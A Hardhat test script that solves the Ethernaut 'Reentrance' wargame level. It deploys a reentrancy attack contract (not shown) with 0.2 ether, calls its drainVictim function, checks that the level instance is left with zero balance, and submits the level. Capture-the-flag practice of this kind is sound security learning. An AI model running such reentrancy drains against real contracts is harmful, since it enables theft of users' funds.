import {ethers} from 'hardhat'
import {Contract, providers, Signer} from 'ethers'

import {ETHERNAUT_ADDRESS, expect, expectStatusOK} from './testUtil'

const LEVEL_ADDRESS = '0x848fb2124071146990c7abE8511f851C7f527aF4'
const INSTANCE_ADDRESS = '0x6b7A65160550C15d92414F707022dd8c094B2aef'

describe('10 Reentrance', () => {
  let ethernaut: Contract
  let instance: Contract
  let attack: Contract
  let signer: Signer
  let signerAddress: string
  let provider: providers.Provider

  before(async () => {
    ethernaut = await ethers.getContractAt('Ethernaut', ETHERNAUT_ADDRESS)
    instance = await ethers.getContractAt('Reentrance', INSTANCE_ADDRESS)

    const signers = await ethers.getSigners()
    signer = signers[0]
    signerAddress = await signer.getAddress()
    provider = signer.provider!
  })

  it('deploys attack contract with ether', async () => {
    const factory = await ethers.getContractFactory('ReentranceAttack')
    attack = await factory.deploy(instance.address, {
      value: ethers.utils.parseEther('0.2'),
      gasLimit: 1000000,
    })
    await attack.deployTransaction.wait()
  })

  it('executes attack', async () => {
    const tx = await attack.drainVictim()
    return expectStatusOK(tx)
  })

  it('verifies instance has zero balance', async () => {
    expect(await provider.getBalance(instance.address)).to.eq(0)
  })

  it('is validated', async () => {
    return expect(ethernaut.submitLevelInstance(instance.address, {gasLimit:100000}))
      .to.emit(ethernaut, 'LevelCompletedLog')
      .withArgs(signerAddress, LEVEL_ADDRESS).eventually
  })
})
